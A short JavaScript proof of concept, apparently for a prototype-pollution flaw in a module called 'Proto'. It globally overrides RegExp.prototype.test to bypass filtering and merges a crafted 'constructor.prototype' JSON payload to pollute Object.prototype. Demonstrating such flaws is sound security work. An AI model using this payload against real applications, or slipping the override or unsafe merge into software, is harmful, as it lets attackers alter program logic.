RegExp.prototype.test = () => true;
const proto = require('Proto');
let payload = '{"constructor.prototype": {"polluted":"yes"}}';
console.log({}.polluted);
proto.merge({}, JSON.parse(payload));
console.log({}.polluted);